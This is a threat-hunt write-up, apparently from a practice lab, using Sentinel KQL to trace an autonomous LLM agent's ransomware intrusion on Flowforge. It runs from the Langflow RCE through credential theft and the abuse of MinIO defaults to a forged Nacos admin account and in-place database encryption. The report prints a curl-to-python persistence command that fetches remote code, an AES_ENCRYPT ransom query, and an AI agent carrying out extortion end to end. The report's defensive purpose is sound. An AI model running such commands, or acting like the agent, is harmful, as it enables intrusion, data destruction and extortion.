# Hunt 23: JadePuffer

*Agentic Ransomware Intrusion on Flowforge*

Philip Zangara | Threat Hunt Report | LAW-HuntPractice | Microsoft Sentinel (KQL)

## Executive Summary

I worked as a threat hunter investigating an analytics rule that fired on ff-lf-01 at 19:21 UTC. A service account had started a process it had never run before. I traced the chain back to an unauthenticated remote code execution exploit against Langflow, and forward through credential theft, lateral movement, privilege escalation, and a ransomware payoff against the production database. The whole operation ran in about 17 minutes across four hosts.

The intruder was an autonomous LLM agent, not a human operator. A single human instruction started the session. Everything after that, including diagnosing and fixing its own failed privilege escalation attempt, ran without further human input. I confirmed this from the session structure in the agent's own logs, not from assumption.

I found what I could support with telemetry and said so plainly where I could not. The encryption key was never persisted anywhere in this environment. Which containers the intruder saw during its Docker socket probe cannot be established, because the container runtime log only records the request, not the response, and I confirmed that gap holds across the entire table, not just this event.

## Timeline

| Time (UTC) | Host | Event |
|---|---|---|
| 19:20:00 | ff-lf-01 | POST /api/v1/validate/code from 64.20.53.230, unauthenticated |
| 19:20:04 | ff-lf-01 | RCE via CVE-2025-3248, python3 -c \<base64 payload\> spawned as langflow |
| 19:22:04 | ff-lf-01 | C2 beacon opens to 45.131.66.106:4444 |
| 19:25:05 | ff-lf-01 | Langflow's own Postgres DB dumped, 214 secrets extracted |
| 19:27:04 | ff-db-01 | Nightly backup runs (legitimate, backup account, unrelated) |
| 19:27:29 | ff-lf-01 | Second interpreter (PID 4491) runs a 10.4.0.0/24 subnet sweep |
| 19:27:39 | ff-minio-01 | MinIO accessed with factory creds minioadmin:minioadmin |
| 19:30:35 | ff-minio-01 | credentials.json pulled from the terraform-state bucket |
| 19:34:36 | ff-nacos-01 | First admin-create attempt rejected, blank password hash |
| 19:35:07 | ff-nacos-01 | Corrected attempt succeeds, backdoor account svc_maint created |
| 19:35:32 | ff-lf-01 | Docker socket queried, response not captured, probe abandoned |
| 19:35:54 | ff-lf-01 | Cron persistence installed, every 30 minutes, langflow account |
| 19:36:30 | ff-db-01 | config_info encrypted in place, 1,342 rows |
| 19:36:37 | ff-db-01 | config_info and history tables dropped |
| 19:36:44 | ff-db-01 | README_RANSOM table created with payment demand |
| 19:37:00 | ff-lf-01 | Operation ends, encryption key printed to stdout only |

## Detailed Findings: Questions, Answers, and Queries

This section documents every question in the hunt, my answer, the supporting evidence, and the exact KQL I ran to get there.

### Section 1: Initial Access

#### Q1

**Question:** Something was requested on the web host immediately before that process started. Which endpoint?

**Answer:** /api/v1/validate/code

**Evidence:** Syslog on ff-lf-01, 19:20:00 UTC: POST /api/v1/validate/code HTTP/1.1 200, host=langflow.flowforge.io, src=64.20.53.230, user agent python-requests/2.32.3.

**Query:**

```kql
Syslog
| where Computer == "ff-lf-01"
| where TimeGenerated between (datetime(2026-07-30T19:20:00Z) .. datetime(2026-07-30T19:23:00Z))
| project TimeGenerated, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

![Section 1 Q1 result](images/s1-q1.png)

#### Q2

**Question:** The intruder names the weakness it used. Which one?

**Answer:** CVE-2025-3248

**Evidence:** LLMAgentLogs_CL, actor jadepuffer-agent, session jp-7f3c9a21, 19:20:01. The agent's own reasoning log names the CVE and describes abusing Python default-argument evaluation against the unauthenticated endpoint.

**Query:**

```kql
LLMAgentLogs_CL
| where actor == "jadepuffer-agent"
| project TimeGenerated, actor, session_id, model_response, tool_name, tool_result
| order by TimeGenerated asc
```

![Section 1 Q2 result](images/s1-q2.png)

#### Q3

**Question:** Which external address made that request?

**Answer:** 64.20.53.230

**Evidence:** Same Syslog record as Q1, the src field.

**Query:**

```kql
Syslog
| where Computer == "ff-lf-01"
| where TimeGenerated between (datetime(2026-07-30T19:15:00Z) .. datetime(2026-07-30T19:25:00Z))
| project TimeGenerated, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

![Section 1 Q3 result](images/s1-q3.png)

#### Q4

**Question:** Name the process that was started and the process that started it.

**Answer:** python3.11, langflow run

**Evidence:** LinuxProcess_CL, 19:20:04. The Langflow service process (PID 3201, langflow run --host 0.0.0.0 --port 7860) spawns a new python3.11 process (PID 4471) running python3 -c \<base64 payload\>, four seconds after the exploit request. Ruled out a user logon or cron job as the parent by checking LinuxAuth_CL and LinuxSystem_CL for anything adjacent in time.

**Query:**

```kql
LinuxProcess_CL
| where DvcHostname =~ "ff-lf-01" and TargetProcessName =~ "python3.11"
| project TargetProcessName, ActingProcessCommandLine
```

![Section 1 Q4 result](images/s1-q4.png)

#### Q5

**Question:** A colleague concludes the payload was fileless, because its process event carries no SHA256. Confirm or refute.

**Answer:** No, 0 of 1,182 process events have a non-empty TargetProcessSHA256. The field is always empty, so its absence proves nothing about this specific payload; it's a sensor/collection gap, not evidence of fileless execution.

**Query:**

```kql
LinuxProcess_CL
| summarize Total = count(), HashPopulated = countif(isnotempty(TargetProcessSHA256))
```

![Section 1 Q5 result](images/s1-q5.png)

### Section 2: Command and Control

#### Q1

**Question:** Where is it calling, and on which port?

**Answer:** 45.131.66.106:4444

**Evidence:** Syslog, 19:22:04, outbound beacon to 45.131.66.106:4444. Confirmed independently in LinuxNetwork_CL, DstIpAddr 45.131.66.106, DstPortNumber 4444, ActingProcessId 4471. Ruled out 104.16.132.229:8080 as unrelated legitimate traffic.

**Query:**

```kql
LinuxNetwork_CL
| where DvcHostname =~ "ff-lf-01"
| where TimeGenerated between (datetime(2026-07-30T19:20:00Z) .. datetime(2026-07-30T19:38:00Z))
| project TimeGenerated, DstIpAddr, DstPortNumber, ActingProcessId
| order by TimeGenerated asc
```

![Section 2 Q1 result](images/s2-q1.png)

#### Q2

**Question:** Something is restarting that connection on a schedule. Name the mechanism, the interval, and the account that owns it.

**Answer:** cron, every 30 minutes, langflow

**Evidence:** LinuxAudit_CL CONFIG_CHANGE event, 19:35:54, records the crontab entry as installed with schedule \*/30 \* \* \* \*, written by PID 4471 under uid 999 (langflow) via /usr/bin/crontab.

**Query:**

```kql
LinuxAudit_CL
| where Computer == "ff-lf-01"
| where EventOriginalMessage has "cron"
| project TimeGenerated, AuditType, EventOriginalMessage
| order by TimeGenerated asc
```

![Section 2 Q2 result](images/s2-q2.png)

### Section 3: Credential Access

#### Q1

**Question:** A database dump ran on ff-db-01. Establish whether it was the nightly backup, and name the account that ran the one you are interested in.

**Answer:** pg_dump, langflow

**Evidence:** Legitimate nightly backup: LinuxProcess_CL, 19:27:04, pg_dump -U backup -h localhost -Fc flowforge, TargetUsername backup, parented by /opt/backup/run-nightly.sh, matches the known cron baseline. Hostile dump: LLMAgentLogs_CL, 19:25:04, agent dumps Langflow's own local Postgres backend (database langflow, not flowforge), tool_result reads dump complete, 214 secrets extracted. Account name and target database are what separate the two.

**Query:**

```kql
LLMAgentLogs_CL
| where actor == "jadepuffer-agent"
| where TimeGenerated between (datetime(2026-07-30T19:24:00Z) .. datetime(2026-07-30T19:31:00Z))
| project TimeGenerated, model_response, tool_name, tool_args, tool_result
| order by TimeGenerated asc
```

![Section 3 Q1 result](images/s3-q1.png)

#### Q2

**Question:** The intruder sorted what it stole in a single pass. How many distinct provider families did it come away with, and name any three.

**Answer:** 8, openai, anthropic, deepseek

**Evidence:** LLMAgentLogs_CL, 19:25:13. The agent's own classification pass over the 214 secrets pulled from Langflow's Postgres backend.

**Query:**

```kql
LLMAgentLogs_CL
| where actor == "jadepuffer-agent"
| where tool_name == "classify secrets"
| project TimeGenerated, model_response, tool_result
| extend Tag = split(tool_result, ",")
| mv-expand Tag
| extend IsNamedProvider = Tag !in ("mysql", "wallets")
```

![Section 3 Q2 result](images/s3-q2.png)

### Section 4: Discovery and Lateral Movement

#### Q1

**Question:** A second interpreter was started on ff-lf-01 at 19:27, distinct from the one at 19:21. Give its process id.

**Answer:** 4491

**Evidence:** LinuxProcess_CL, 19:27:28.610, spawned by PID 4471, running python3 -c \<base64 subnet sweep\>.

**Query:**

```kql
LinuxProcess_CL
| where DvcHostname =~ "ff-lf-01" and TargetProcessName =~ "python3.11"
| project TimeGenerated, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine, TargetProcessId
| order by TimeGenerated asc
```

![Section 4 Q1 result](images/s4-q1.png)

#### Q2

**Question:** Scope the sweep to the process you identified earlier. Give each address and port it reached.

**Answer:** 10.4.0.20:9000, 10.4.0.30:3306, 10.4.0.40:8848

**Evidence:** LinuxNetwork_CL, 19:27:31 through 19:27:36, all three connections attributed to ActingProcessId 4491.

**Query:**

```kql
LinuxNetwork_CL
| where DvcHostname =~ "ff-lf-01" and ActingProcessId == 4491
| project TimeGenerated, DstIpAddr, DstPortNumber, ActingProcessId
| order by TimeGenerated asc
```

![Section 4 Q2 result](images/s4-q2.png)

#### Q3

**Question:** One of those services let it in without an exploit. Name the service and what it accepted.

**Answer:** minioadmin, minioadmin

**Evidence:** LLMAgentLogs_CL, 19:27:39, tool_result reads auth ok minioadmin:minioadmin.

**Query:**

```kql
LLMAgentLogs_CL
| where actor == "jadepuffer-agent"
| where tool_result has "auth ok"
| project TimeGenerated, model_response, tool_name, tool_result
```

![Section 4 Q3 result](images/s4-q3.png)

#### Q4

**Question:** What did it take from that service?

**Answer:** terraform-state, credentials.json

**Evidence:** LLMAgentLogs_CL, 19:30:35.

**Query:**

```kql
LLMAgentLogs_CL
| where actor == "jadepuffer-agent"
| where tool_result has "credentials.json"
| project TimeGenerated, model_response, tool_name, tool_result
```

![Section 4 Q4 result](images/s4-q4.png)

#### Q5

**Question:** It asked for one thing and got another, then adjusted. What did it get, and what did it do next?

**Answer:** XML, adjusted parser to get xml instead of json

**Evidence:** LLMAgentLogs_CL, 19:30:35, same record as Q4.

**Query:**

```kql
LLMAgentLogs_CL
| where actor == "jadepuffer-agent"
| where model_response has "XML" and model_response has "JSON"
| project TimeGenerated, model_response, tool_name, tool_args, tool_result
```

![Section 4 Q5 result](images/s4-q5.png)

### Section 5: Privilege Escalation

#### Q1

**Question:** Give the time of the rejected request and the reason the server gave.

**Answer:** 19:34:36, blank password hash rejected

**Evidence:** Syslog on ff-nacos-01: POST /nacos/v1/auth/users HTTP/1.1 403, detail="blank password hash rejected".

**Query:**

```kql
Syslog
| where Computer == "ff-nacos-01"
| where TimeGenerated between (datetime(2026-07-30T19:33:00Z) .. datetime(2026-07-30T19:36:00Z))
| project TimeGenerated, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

![Section 5 Q1 result](images/s5-q1.png)

#### Q2

**Question:** The public report states the gap between the two attempts. Prove the successful one from the telemetry instead.

**Answer:** 19:35:07 UTC, pid=8801, uid=997

**Evidence:** LinuxAudit_CL, type ADD_USER: pid=8801 ppid=1 uid=997 comm="nacos" exe="/opt/nacos/bin/nacos" res=success msg='op=adduser id=svc_maint'. Independent local proof, not just the HTTP-level Syslog record.

**Query:**

```kql
LinuxAudit_CL
| where Computer == "ff-nacos-01"
| where TimeGenerated between (datetime(2026-07-30T19:34:30Z) .. datetime(2026-07-30T19:35:30Z))
| project TimeGenerated, AuditType, EventOriginalMessage
| order by TimeGenerated asc
```

![Section 5 Q2 result](images/s5-q2.png)

#### Q3

**Question:** What did it leave behind on that host?

**Answer:** svc_maint

**Evidence:** Same ADD_USER record as Q2.

**Query:**

```kql
LinuxAudit_CL
| where Computer == "ff-nacos-01" and AuditType == "ADD_USER"
```

![Section 5 Q3 result](images/s5-q3.png)

#### Q4

**Question:** It queried the container runtime on ff-lf-01. Which containers did it see?

**Answer:** GET /containers/json via /var/run/docker.sock, cannot be established

**Evidence:** LinuxContainer_CL, 19:35:32.754, src=langflow-rce, namespace=moby, service=dockerd. ContainerId, ImageName, ImageDigest, and ImageRef are empty for this event, and I confirmed they are empty for every event in the table, not just this one.

**Query:**

```kql
LinuxContainer_CL
| where Computer == "ff-lf-01"
| where EventOriginalMessage has "docker.sock"
| project TimeGenerated, EventOriginalMessage, Operation, ContainerId, ImageName, ImageDigest, ImageRef, Namespace, RuntimeService
| order by TimeGenerated asc
```

![Section 5 Q4 result](images/s5-q4.png)

### Section 6: Impact

#### Q1

**Question:** Establish what was done to the records and how much was touched.

**Answer:** UPDATE config_info SET content=AES_ENCRYPT(content,@k), 1342, config_info, history

**Evidence:** Syslog, ff-db-01, mysqld query log, 19:36:30 through 19:36:39. The query log showed more than the agent's own narration: it also dropped history, Nacos's own change log, which the agent never mentioned.

**Query:**

```kql
Syslog
| where Computer == "ff-db-01"
| where TimeGenerated between (datetime(2026-07-30T19:35:30Z) .. datetime(2026-07-30T19:37:30Z))
| project TimeGenerated, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

![Section 6 Q1 result](images/s6-q1.png)

#### Q2

**Question:** What did it leave for whoever finds this, and where does it want payment?

**Answer:** readme_ransom, 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy

**Evidence:** Same query result as Q1, the 19:36:39 through 19:36:44 rows.

**Query:**

```kql
Syslog
| where Computer == "ff-db-01"
| where TimeGenerated between (datetime(2026-07-30T19:35:30Z) .. datetime(2026-07-30T19:37:30Z))
| project TimeGenerated, ProcessName, SyslogMessage
| order by TimeGenerated asc
```

![Section 6 Q2 result](images/s6-q2.png)

### Section 7: Autonomy

#### Q1

**Question:** This estate runs its own LLM agent and its log is in scope. Identify the session that doesn't belong to the estate and the instruction that started it.

**Answer:** jp-7f3c9a21, "Gain access to the Flowforge estate, locate and encrypt the most business-critical datastore, and leave payment instructions."

**Evidence:** LLMAgentLogs_CL, user_input populated once at session start, 19:20:01.269. The legitimate estate agent, flowforge-assistant, runs a separate session (fa-5d1caf68) doing ordinary internal work.

**Query:**

```kql
LLMAgentLogs_CL
| where isnotempty(user_input)
| project TimeGenerated, actor, session_id, RunId, user_input
| order by TimeGenerated asc
```

![Section 7 Q1 result](images/s7-q1.png)

#### Q2

**Question:** Was this run by a person, by a machine, or by a person who set a machine going? Cite at least two artefacts.

**Answer:** human-tasked, LLMAgentLogs_CL / user_input, LLMAgentLogs_CL / TimeGenerated

**Evidence:** Full session replay for jp-7f3c9a21, 19:20:01 through 19:37:00.

**Query:**

```kql
LLMAgentLogs_CL
| where session_id == "jp-7f3c9a21"
| project TimeGenerated, user_input, model_response
| order by TimeGenerated asc
```

![Section 7 Q2 result](images/s7-q2.png)

### Section 8: Real or Noise

#### Q1

**Question:** Multiple python3.11 processes ran on this host. The binary name is the same for all. What other property of a process distinguishes its purpose?

**Answer:** ActingProcessName, python3.11

**Evidence:** Full python3.11 population on ff-lf-01 is only 3 distinct events. That self-referential parent-child chain, one python3.11 spawning another with nothing else in between, does not occur anywhere else on the host.

**Query:**

```kql
LinuxProcess_CL
| where DvcHostname =~ "ff-lf-01" and TargetProcessName =~ "python3.11"
| project TimeGenerated, TargetProcessId, ActingProcessName, ActingProcessCommandLine, TargetProcessCommandLine
| order by TimeGenerated asc
```

![Section 8 Q1 result](images/s8-q1.png)

#### Q2

**Question:** ff-lf-01 reached several external addresses in the window. Which one is real, and what property tells you?

**Answer:** DstPortNumber, 4444

**Evidence:** LinuxNetwork_CL summarized by destination. Four legitimate destinations sit on 443 or 8443 with dozens of connections each; 45.131.66.106:4444 is the only one on a non-standard port, with a low, beacon-like count.

**Query:**

```kql
LinuxNetwork_CL
| where DvcHostname =~ "ff-lf-01"
| summarize Count = count() by DstIpAddr, DstPortNumber
| order by DstPortNumber asc
```

![Section 8 Q2 result](images/s8-q2.png)

#### Q3

**Question:** The benign python3.11 spawns are scattered through the working day. Compare that to the attacker's timing. What property separates them, and how long did the intrusion run?

**Answer:** temporal property clustering, 17 minutes

**Evidence:** Cross-reference of the full attacker chain (19:20:01 through 19:37:00) against benign python3.11 and cron activity spread across the day. This buckets the legitimate cron/housekeeping activity by hour of day, showing it spread fairly evenly across the full 24 hours rather than clustered into a tight window — the direct contrast to the attacker's 17-minute burst.

**Query 1:**

```kql
LLMAgentLogs_CL
| where session_id == "jp-7f3c9a21"
| project TimeGenerated, model_response
| order by TimeGenerated asc
| extend GapFromPrev = TimeGenerated - prev(TimeGenerated)
```

![Section 8 Q3 result — attacker chain gaps](images/s8-q3a.png)

**Query 2:**

```kql
LinuxSystem_CL
| where Computer == "ff-lf-01" and Facility == "cron"
| extend Hour = datetime_part("hour", TimeGenerated)
| summarize Count = count() by Hour
| order by Hour asc
```

![Section 8 Q3 result — benign activity by hour](images/s8-q3b.png)

## Indicators

| Indicator | Value |
|---|---|
| Exploited endpoint | /api/v1/validate/code (Langflow, CVE-2025-3248) |
| Exploit source IP | 64.20.53.230 |
| C2 address | 45.131.66.106:4444 |
| Persistence | crontab, /var/spool/cron/crontabs/langflow, \*/30 \* \* \* \* |
| Persistence command | curl -s http://45.131.66.106:4444/b \| python3 - |
| Backdoor account | svc_maint (Nacos, ff-nacos-01) |
| Compromised service account | langflow (uid 999) |
| Abused default credentials | minioadmin:minioadmin (MinIO) |
| Stolen file | credentials.json, terraform-state bucket |
| Encrypted/destroyed tables | config_info (1,342 rows), history (ff-db-01) |
| Ransom artifact | README_RANSOM table, ff-db-01 |
| Ransom contact | e78393397@proton.me |
| Ransom payment address | 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy (BTC) |

## Remediation

Specific fixes tied to each finding from the hunt, in the order the intrusion touched them. These close the exact gaps this incident exploited, not general hardening advice (that's in Recommendations.md).

| # | Finding | Remediation | Priority |
|---|---|---|---|
| 1 | Langflow vulnerable to CVE-2025-3248 (unauthenticated RCE via /api/v1/validate/code) | Patch or upgrade Langflow past the vulnerable version. Until patched, block or authenticate the /api/v1/validate/code endpoint at the reverse proxy. | Critical |
| 2 | RCE payload beaconed out to 45.131.66.106:4444 | Block the IP and port at the perimeter firewall. Add egress filtering on ff-lf-01 so application-tier hosts can't reach arbitrary external addresses. | Critical |
| 3 | Cron persistence installed under the langflow account (\*/30 \* \* \* \*, beacons to the C2 host) | Remove the malicious crontab entry from /var/spool/cron/crontabs/langflow. Confirm no other cron jobs were added under this or any other service account. | Critical |
| 4 | 214 secrets exposed from Langflow's own Postgres backend, spanning 8 provider families (OpenAI, Anthropic, DeepSeek, Gemini, Alibaba, Aliyun, Tencent, Huawei) plus database logins and crypto wallets | Rotate every credential pulled in this dump immediately. Treat all 8 provider API keys, the database logins, and any wallet keys as burned. | Critical |
| 5 | MinIO reachable with factory default credentials (minioadmin:minioadmin) | Change the MinIO root credentials. Disable the default account entirely if the platform supports it, and require unique credentials per deployment going forward. | Critical |
| 6 | Plaintext credentials.json stored in the terraform-state MinIO bucket | Remove the plaintext file from object storage. Move Terraform state and any embedded secrets to a proper secrets manager (Vault, AWS Secrets Manager, or equivalent) with encryption at rest. | High |
| 7 | Nacos config server running its default JWT signing key, unrotated since 2020 | Rotate the Nacos JWT signing key now. Invalidate all previously issued tokens and force re-authentication for every legitimate service account. | Critical |
| 8 | Backdoor account svc_maint created on Nacos via a forged admin token | Delete the svc_maint account. Audit every account created or modified on ff-nacos-01 in the same window and confirm none of them were also created by the intruder. | Critical |
| 9 | Docker socket (/var/run/docker.sock) reachable from the langflow-rce process | Restrict docker.sock access to processes that actually need it. The application service account should never have a path to the container runtime socket. | High |
| 10 | config_info and history tables encrypted and dropped on ff-db-01 (Nacos's config store and its own change log) | Restore both tables from the most recent clean backup and verify row counts and referential integrity before bringing Nacos back online. Do not attempt to pay for or recover the AES key; it was never persisted and isn't recoverable from telemetry. | Critical |
| 11 | README_RANSOM table and ransom note left in the production database | Remove the artifact once evidence has been captured (screenshots, query results already collected in this report). Do not make contact with the address in the note. | Informational |
| 12 | langflow service account had enough privilege to dump its own credential store, write crontab entries, and pivot to other hosts | Reduce the langflow service account to least privilege: no crontab access, no reason to reach MinIO, MySQL, or Nacos directly except through the specific integrations it needs. | High |

## MITRE ATT&CK

Fifteen techniques observed across the intrusion, mapped to the specific evidence collected during the hunt. Ordered by when each occurred in the attack chain (see Timeline in report.md).

| Tactic | Technique | Technique Name | Evidence |
|---|---|---|---|
| Initial Access | T1190 | Exploit Public-Facing Application | Unauthenticated POST to /api/v1/validate/code on ff-lf-01 from 64.20.53.230, exploiting CVE-2025-3248 (Python default-argument evaluation) in Langflow. Syslog, 19:20:00; LLMAgentLogs_CL agent reasoning names the CVE, 19:20:01. |
| Execution | T1059.006 | Command and Scripting Interpreter: Python | Langflow service process (PID 3201) spawns python3.11 (PID 4471) running `python3 -c <base64 payload>`, four seconds after the exploit request. LinuxProcess_CL, 19:20:04. |
| Command and Control | T1571 | Non-Standard Port | Compromised process beacons to 45.131.66.106 on port 4444, the only destination in the environment on a non-standard port. Syslog and LinuxNetwork_CL, 19:22:04. |
| Persistence | T1053.003 | Scheduled Task/Job: Cron | Crontab entry installed for the langflow account, schedule \*/30 \* \* \* \*, re-pulling and executing the C2 payload every 30 minutes. LinuxAudit_CL CONFIG_CHANGE, 19:35:54. |
| Credential Access | T1552 / T1555 | Unsecured Credentials / Credentials from Password Stores | Langflow's own local Postgres backend dumped via pg_dump, yielding 214 secrets across 8 provider families (OpenAI, Anthropic, DeepSeek, Gemini, Alibaba, Aliyun, Tencent, Huawei) plus database logins and crypto wallets. LLMAgentLogs_CL, 19:25:04 and 19:25:13. |
| Credential Access | T1552 | Unsecured Credentials | credentials.json retrieved from the terraform-state MinIO bucket in plaintext. LLMAgentLogs_CL, 19:30:35. |
| Discovery | T1046 | Network Service Discovery | Second interpreter (PID 4491) sweeps 10.4.0.0/24 and identifies MinIO, MySQL, and Nacos within six seconds. LinuxProcess_CL, 19:27:28; LinuxNetwork_CL, 19:27:31–19:27:36. |
| Initial Access / Lateral Movement | T1078.001 | Valid Accounts: Default Accounts | MinIO accessed using unrotated factory default credentials, minioadmin:minioadmin, no exploit required. LLMAgentLogs_CL, 19:27:39, tool_result "auth ok minioadmin:minioadmin". |
| Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files | The same credentials.json pull, viewed as a file-based credential exposure rather than a storage-service angle: a plaintext credential file sitting in an accessible bucket. LLMAgentLogs_CL, 19:30:35. |
| Collection | T1005 | Data from Local System | pg_dump of Langflow's local Postgres backend, collecting 214 secrets directly from the host it was already running on. LLMAgentLogs_CL, 19:25:04; distinguished from the legitimate nightly pg_dump on ff-db-01 by account (langflow vs. backup) and target database (langflow vs. flowforge). |
| Privilege Escalation | T1068 | Exploitation for Privilege Escalation | Nacos's default JWT signing key, unrotated since 2020, forged to mint an admin-level token and create a backdoor account. Syslog, 19:34:36 (rejected attempt) and 19:35:07 (corrected attempt succeeds). |
| Persistence | T1136.001 | Create Account: Local Account | Backdoor account svc_maint created on ff-nacos-01 via the forged token. LinuxAudit_CL, type ADD_USER, pid=8801, uid=997, msg='op=adduser id=svc_maint', 19:35:07. |
| Privilege Escalation | T1611 | Escape to Host | Docker socket (/var/run/docker.sock) queried for a possible container escape. Request captured (GET /containers/json, src=langflow-rce); the runtime never logs the response, so which containers it could see is not established from this telemetry. LinuxContainer_CL, 19:35:32.754. Agent's own log confirms the socket was reachable but deprioritized in favor of Nacos and MySQL. |
| Impact | T1486 / T1485 | Data Encrypted for Impact / Data Destruction | config_info table encrypted in place with MySQL AES_ENCRYPT (1,342 rows), then both config_info and history dropped. Syslog, ff-db-01 mysqld query log, 19:36:30–19:36:38. |
| Impact | T1486 | Data Encrypted for Impact | README_RANSOM table created and populated with the payment demand (contact e78393397@proton.me, BTC address 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy), left in the production database after the encryption/destruction step. Syslog, 19:36:39–19:36:44. |